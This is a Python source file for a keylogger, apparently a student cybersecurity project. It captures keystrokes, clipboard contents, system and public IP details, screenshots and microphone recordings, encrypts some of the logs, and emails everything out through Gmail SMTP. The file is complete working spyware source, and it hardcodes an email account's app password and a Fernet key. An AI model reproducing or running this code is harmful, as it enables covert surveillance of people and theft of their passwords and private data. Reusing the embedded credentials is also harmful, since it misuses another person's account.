from email.mime.multipart import MIMEMultipart # format email messages to support character text, email attachments, audio, video, etc
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket # to collect computer information
import platform

import win32clipboard

from pynput.keyboard import Key, Listener # key logs the key and listener listens for each key typed into keyboard

import time
import os

from scipy.io.wavfile import write # for microphone capabilities
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass # to get username
from requests import get

from multiprocessing import Process, freeze_support # for screenshot abilities
from PIL import ImageGrab

count = 0
keys = []

username = getpass.getuser()


file_path = "C:\\Users\\Harish\\OneDrive\\College\\cybersecurity-projects\\KEYLOGGER\\project\\"

key = "NG2C0jvomx62ldZ3cKdfPl4BKLo1kC5m52VRL20k_Qk="

email_address = "mydummycyber@gmail.com"
password = "naiy atru kgsg qeix"
toAddress = "mydummycyber@gmail.com"

keys_info = "key_log.txt"
system_info = "systeminfo.txt"
clipboard_info = "clipboardinfo.txt"
microphone_time = 10
audio_info = "audio.wav"
screenshot_info = "screenshot.png"

enc_keys_info = "enc_key_log.txt"
enc_system_info = "enc_systeminfo.txt"
enc_clipboard_info = "enc_clipboardinfo.txt"

time_iteration = 27 # each iteration to go on for 15 seconds
num_of_iterations = 1 # number of iterations for 15 seconds each

def send_email(filenames, attachments, toaddress):

    fromaddr = email_address

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddress
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))


    # responsible for attaching the file to email
    for filename, attachment in zip(filenames, attachments):
        with open(attachment, 'rb') as att:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(att.read())  # Read the file in binary mode
            encoders.encode_base64(p)  # Encode the file to ASCII
            p.add_header('Content-Disposition', f'attachment; filename={filename}')
            msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587) # initialize connection for tls encryption
    s.starttls() # starts the connection
    s.login(fromaddr, password)
    text = msg.as_string() # convert to string for sending
    s.sendmail(fromaddr, toaddress, text)

    s.quit()

# send_email(keys_info, file_path + keys_info, toaddress)

def computer_information():
    with open(file_path + system_info,"w") as file:
        hostname = socket.gethostname()
        IPAddress = socket.gethostbyname(hostname)

        # using ipify to get public ip has max limit queries
        # once limit reached, keylogger stops functioning
        try:
            publicIPAdress = get("https://api.ipify.org").text
            file.write("Public IP Address : " + publicIPAdress + "\n")
        except Exception:
            file.write("Could not get Public IP Address (most likely due to max query limit being reached)")
        
        file.write("Processor : " + platform.processor() + "\n")
        file.write("System : " + platform.system() + " " + platform.version() + "\n")
        file.write("Machine : " + platform.machine() + "\n")
        file.write("Hostname : " + hostname + "\n")
        file.write("Private IP Adrress : " + IPAddress + "\n")
# computer_information()

def clipboard():
    with open(file_path+clipboard_info,"w") as file:
        # if the copied content is a string
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            file.write("Clipboard Data : \n" + pasted_data)
        except:
            file.write("Clipboard could not be copied (not a string)")
# clipboard()

def microphone():
    sf = 44100 # sampling frequency
    seconds = microphone_time # amount of seconds to record microphone

    myrecording = sd.rec(int(seconds * sf), samplerate = sf, channels = 2)
    sd.wait()
    
    write(file_path+audio_info, sf, myrecording) # from the scipy.io.wavfile modul
# microphone()

def screenshot():
    img = ImageGrab.grab()
    img.save(file_path+screenshot_info)
# screenshot()

iterations = 0
currentTime = time.time()
stopTime = time.time() + time_iteration

while(iterations < num_of_iterations):
    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 0:
            count = 0
            write_to_file(keys)
            keys = []   

    def write_to_file(keys):
        with open(file_path + keys_info, "a") as file:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    file.write('\n')
                    file.close()
                elif k.find("enter") > 0:  # if the key is Enter, add a newline
                    file.write("\n")
                elif k.find("Key") == -1:
                    file.write(k)
                    file.close()

    def on_release(key):
        if key == Key.esc: # exit key logger if escape key pressed
            return False
        if currentTime > stopTime:
            return False

    with Listener (on_press = on_press, on_release = on_release) as listener:
        listener.join() # joins the keys together

    if currentTime > stopTime:
        
        clipboard()
        computer_information()

        # for easy access of files
        files_to_encrypt = [file_path + keys_info, file_path + system_info, file_path + clipboard_info]
        encrypted_files = [file_path + enc_keys_info, file_path + enc_system_info, file_path + enc_clipboard_info]
        

        count = 0
        for encrypt_file in files_to_encrypt:
            with open(encrypt_file, 'rb') as file:
                data = file.read()
            
            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)

            with open(encrypted_files[count],'wb') as file:
                file.write(encrypted)
            count += 1

        with open(file_path + keys_info,"w") as file: # reset file after logging
            file.write("")

        screenshot()
        microphone()

        filenames = [enc_keys_info, enc_system_info, enc_clipboard_info, screenshot_info, audio_info]
        attachments = encrypted_files + [file_path + screenshot_info, file_path + audio_info]
        send_email(filenames, attachments, toAddress)

        iterations += 1
        currentTime = time.time()
        stopTime = time.time() + time_iteration

time.sleep(35)